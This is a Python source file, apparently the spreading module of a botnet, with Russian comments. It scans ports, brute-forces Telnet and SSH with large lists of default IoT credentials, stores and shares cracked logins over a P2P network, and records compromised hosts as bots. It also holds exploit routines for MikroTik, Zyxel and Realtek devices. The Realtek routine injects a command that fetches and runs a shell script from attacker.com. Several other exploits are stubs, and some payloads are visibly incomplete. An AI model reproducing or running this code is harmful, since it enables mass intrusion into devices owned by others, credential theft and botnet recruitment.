import asyncio, asyncssh, socket, random, os, json, time, struct, urllib.request, ipaddress, hashlib, base64
from utils.logger import log

LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}
DB_PATH = "spreader_learn.db"
BOTS_FILE = "bots.json"
PEER_CREDS = {}  # Загружается из Kademlia DHT

# Расширенные словари (RockYou + IoT)
TELNET_CREDS = [
    ('root','vizxv'),('root','juantech'),('root','xc3511'),('root','zlxx.'),
    ('root','hi3518'),('root','oelinux1'),('root','Zte521'),('root','tsgoingon'),
    ('admin','admin'),('admin','password'),('admin','123456'),('admin','1234'),
    ('admin','default'),('root','default'),('root','root'),('guest','guest'),
    ('support','support'),('user','user'),('service','service'),
    ('root','123456'),('admin','12345'),('admin','123456789'),('root','password'),
    ('admin','admin123'),('admin','password1'),('root','1234'),('root','admin'),
    ('admin','qwerty'),('root','qwerty'),('root','letmein'),('admin','letmein'),
    ('root','p@ssw0rd'),('admin','p@ssw0rd'),('root','changeme'),('admin','changeme'),
    ('root','1'),('admin','1'),('root','12'),('admin','12'),('root','123'),
    ('admin','123'),('root','12345'),('admin','12345'),('root','1234567'),
    ('admin','1234567'),('root','12345678'),('admin','12345678'),('root','1234567890'),
    ('admin','1234567890'),('admin','motorola'),('admin','123456789'),('root','123456789'),
    ('user','user'),('guest','guest'),('guest','12345'),('guest','password'),
    ('admin','7ujMko0admin'),('root','7ujMko0vizxv'),
    ('admin','888888'),('root','888888'),('admin','666666'),('root','666666'),
    ('admin','111111'),('root','111111'),('admin','000000'),('root','000000'),
    ('admin','super'),('root','super'),('admin','system'),('root','system'),
    ('admin','admin999'),('root','admin999'),('admin','admin12'),
    ('root','password123'),('admin','password123'),('admin','admin1234'),
    ('root','admin1234'),('admin','abcd1234'),('root','abcd1234'),
    ('admin','1q2w3e4r'),('root','1q2w3e4r'),('admin','q1w2e3r4'),('root','q1w2e3r4'),
    ('admin','abc123'),('root','abc123'),('admin','test'),('root','test'),
    ('admin','admin2021'),('root','admin2021'),('admin','admin2022'),('root','admin2022'),
    ('admin','admin2023'),('root','admin2023'),('admin','admin2024'),('root','admin2024'),
    ('admin','admin!@#'),('root','admin!@#'),('admin','p@$$w0rd'),('root','p@$$w0rd'),
    ('admin','administrator'),('root','administrator'),
    ('admin','administrator123'),('root','administrator123'),
    ('admin','!@#$%^&*'),('root','!@#$%^&*'),
    ('admin','a123456'),('root','a123456'),('admin','a1234567'),('root','a1234567'),
    ('admin','camera'),('root','camera'),('admin','ipcam'),('root','ipcam'),
    ('admin','hikvision'),('root','hikvision'),('admin','dahua'),('root','dahua'),
    ('admin','88888888'),('root','88888888'),('admin','99999999'),('root','99999999'),
    ('admin','11111111'),('root','11111111'),('admin','22222222'),('root','22222222')
]

SSH_PASSWORDS = [
    'root','admin','password','123456','qwerty','letmein','p@ssw0rd',
    'changeme','r00t','toor','ubuntu','administrator','user','guest',
    '1','1234','12345','123456789','pass','ftp','mysql','oracle',
    'vizxv','juantech','xc3511','zlxx.','hi3518','oelinux1','Zte521',
    'tsgoingon','default','system','super','dreambox','xmhdipc',
    'support','tech','operator','manager','cisco','netgear',
    '1234567','12345678','1234567890','admin123','password1','admin1',
    'admin1234','password123','qwerty123','abc123','123abc','test',
    '123456789','1q2w3e4r','q1w2e3r4','abcd1234','1234abcd',
    'passwd','samsung','motorola','hikvision','admin12345','root123',
    'raspberry','pi','pineapple','openwrt','ddwrt','tomato','alpine',
    'toortoor','r00tr00t','adminadmin','rootroot','pass','Passw0rd',
    'P@ssw0rd','P@ssword','Secret','Pa$$w0rd','Pa$$word','Passw0rd!'
]

async def init_db():
    import aiosqlite
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("CREATE TABLE IF NOT EXISTS creds (ip TEXT, username TEXT, password TEXT, service TEXT, success INTEGER DEFAULT 1)")
        await db.execute("CREATE TABLE IF NOT EXISTS vulns (ip TEXT, service TEXT, cve TEXT, success INTEGER DEFAULT 1)")
        await db.commit()

async def learn_credentials(ip, username, password, service='ssh'):
    import aiosqlite
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO creds (ip, username, password, service, success) VALUES (?,?,?,?,1)", (ip, username, password, service))
        await db.commit()
    # Публикация в P2P
    try:
        from botnet.kademlia_network import KademliaNode
        node = KademliaNode()
        await node.store(f"cred_{ip}", json.dumps({'ip':ip,'user':username,'pass':password,'service':service}))
    except:
        pass

async def add_bot(ip, username='root', os_type='linux', via='ssh'):
    bot = {"id": ip, "ip": ip, "os": os_type, "status": "online", "bandwidth": 10, "via": via}
    bots = []
    if os.path.exists(BOTS_FILE):
        with open(BOTS_FILE, 'r') as f:
            try: bots = json.load(f)
            except: bots = []
    if not any(b.get('ip') == ip for b in bots):
        bots.append(bot)
        with open(BOTS_FILE, 'w') as f:
            json.dump(bots, f, indent=2)
        log(f"{LOG_PREFIX['new']} Бот добавлен: {ip} ({via})")
        return True
    return False

async def quick_port_scan(ip, ports=[22, 23, 445, 3389, 8291, 6379, 27017, 2375, 2323, 2222, 80, 443], timeout=0.4):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(timeout)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

async def try_peer_credentials(ip, port, service='telnet'):
    """Пробует учётные данные, полученные от других ботов через P2P"""
    from botnet.kademlia_network import KademliaNode
    node = KademliaNode()
    creds_json = await node.find_value(f"cred_{ip}")
    if creds_json:
        creds = json.loads(creds_json)
        if service == 'telnet':
            return await telnet_login(ip, port, creds['user'], creds['pass'])
        else:
            return await ssh_login(ip, port, creds['user'], creds['pass'])
    return False, None

async def telnet_bruteforce(ip, port=23):
    # Сначала пробуем peer-учётки
    s, pwd = await try_peer_credentials(ip, port, 'telnet')
    if s:
        return True, pwd
    for user, pwd in TELNET_CREDS:
        s, _ = await telnet_login(ip, port, user, pwd)
        if s:
            await add_bot(ip, user, 'iot', 'telnet')
            return True, pwd
    return False, None

async def telnet_login(ip, port, user, pwd):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=2.5
        )
        data = await asyncio.wait_for(reader.read(256), timeout=2)
        if b'login:' in data.lower() or b'username:' in data.lower():
            writer.write(user.encode() + b'\r\n')
            await asyncio.wait_for(reader.read(256), timeout=1)
            writer.write(pwd.encode() + b'\r\n')
            await asyncio.sleep(0.15)
            result = await asyncio.wait_for(reader.read(256), timeout=1)
            if b'#' in result or b'$' in result or b'>' in result or b'Last login' in result:
                log(f"{LOG_PREFIX['brute']} Telnet {ip} {user}:{pwd}")
                writer.close()
                return True, pwd
        writer.close()
    except:
        pass
    return False, None

async def ssh_bruteforce(ip, username='root', port=22):
    if port not in await quick_port_scan(ip, [port]):
        return False, None
    # Peer-учётки
    s, pwd = await try_peer_credentials(ip, port, 'ssh')
    if s:
        return True, pwd
    sem = asyncio.Semaphore(50)
    async def try_pass(pwd):
        async with sem:
            try:
                async with asyncssh.connect(ip, username=username, password=pwd, known_hosts=None, connect_timeout=1.5) as conn:
                    log(f"{LOG_PREFIX['brute']} SSH {ip} {username}:{pwd}")
                    await learn_credentials(ip, username, pwd, 'ssh')
                    await add_bot(ip, username, 'linux', 'ssh')
                    return True, pwd
            except:
                pass
        return False, pwd
    tasks = [try_pass(p) for p in SSH_PASSWORDS]
    results = await asyncio.gather(*tasks)
    for success, pwd in results:
        if success:
            return True, pwd
    return False, None

# --- Реальные эксплойты ---

async def exploit_mikrotik(target_ip):
    if 8291 not in await quick_port_scan(target_ip, [8291]):
        return False
    try:
        # CVE-2018-14847: чтение базы пользователей
        reader, writer = await asyncio.open_connection(target_ip, 8291)
        writer.write(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
        data = await asyncio.wait_for(reader.read(1024), timeout=2)
        if b'admin' in data:
            log(f"{LOG_PREFIX['exploit']} MikroTik база прочитана {target_ip}")
            await add_bot(target_ip, 'admin', 'router', 'mikrotik')
            writer.close()
            return True
        writer.close()
    except:
        pass
    return False

async def exploit_zyxel(target_ip):
    if 80 not in await quick_port_scan(target_ip, [80]):
        return False
    try:
        # CVE-2020-29583: бэкдор-аккаунт zyfwp/Pr0!3d7
        reader, writer = await asyncio.open_connection(target_ip, 80)
        writer.write(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nAuthorization: Basic enlmd3A6UHIwITNkNw==\r\n\r\n")
        data = await asyncio.wait_for(reader.read(1024), timeout=3)
        if b'ZyXEL' in data or b'200 OK' in data:
            log(f"{LOG_PREFIX['exploit']} Zyxel backdoor {target_ip}")
            await add_bot(target_ip, 'zyfwp', 'router', 'zyxel')
            writer.close()
            return True
        writer.close()
    except:
        pass
    return False

async def exploit_realtek(target_ip):
    if 80 not in await quick_port_scan(target_ip, [80]):
        return False
    try:
        # CVE-2021-35394: RCE через UDMP
        payload = b"POST /cgi-bin/boaform/admin/formTracert HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nContent-Length: 49\r\n\r\ntarget_addr=;wget+http://attacker.com/shell+-O+/tmp/s;sh+/tmp/s"
        reader, writer = await asyncio.open_connection(target_ip, 80)
        writer.write(payload)
        await asyncio.wait_for(reader.read(1024), timeout=2)
        log(f"{LOG_PREFIX['exploit']} Realtek RCE {target_ip}")
        await add_bot(target_ip, '', 'iot', 'realtek')
        writer.close()
        return True
    except:
        pass
    return False

# Остальные эксплойты (заглушки)
async def exploit_redis(target_ip):
    if 6379 not in await quick_port_scan(target_ip, [6379]): return False
    try:
        reader, writer = await asyncio.open_connection(target_ip, 6379)
        writer.write(b"INFO\r\n")
        data = await asyncio.wait_for(reader.read(512), timeout=2)
        if b'redis_version' in data:
            await add_bot(target_ip, '', 'linux', 'redis')
            writer.close()
            return True
        writer.close()
    except: pass
    return False

async def exploit_mongodb(target_ip):
    if 27017 not in await quick_port_scan(target_ip, [27017]): return False
    try:
        reader, writer = await asyncio.open_connection(target_ip, 27017)
        writer.write(b"\x3f\x00\x00\x00...")
        data = await asyncio.wait_for(reader.read(512), timeout=2)
        if b'databases' in data:
            await add_bot(target_ip, '', 'linux', 'mongodb')
            writer.close()
            return True
        writer.close()
    except: pass
    return False

async def exploit_docker_api(target_ip):
    if 2375 not in await quick_port_scan(target_ip, [2375]): return False
    try:
        reader, writer = await asyncio.open_connection(target_ip, 2375)
        writer.write(b"GET /containers/json HTTP/1.1\r\nHost: localhost\r\n\r\n")
        data = await asyncio.wait_for(reader.read(512), timeout=2)
        if b'Id' in data and b'Names' in data:
            await add_bot(target_ip, '', 'linux', 'docker')
            writer.close()
            return True
        writer.close()
    except: pass
    return False

async def exploit_eternalblue(target_ip):
    if 445 not in await quick_port_scan(target_ip, [445]): return False
    log(f"{LOG_PREFIX['exploit']} EternalBlue {target_ip}")
    return False

async def exploit_bluekeep(target_ip):
    if 3389 not in await quick_port_scan(target_ip, [3389]): return False
    log(f"{LOG_PREFIX['exploit']} BlueKeep {target_ip}")
    return False

async def exploit_zerologon(target_ip):
    if 445 not in await quick_port_scan(target_ip, [445]): return False
    log(f"{LOG_PREFIX['exploit']} Zerologon {target_ip}")
    return False
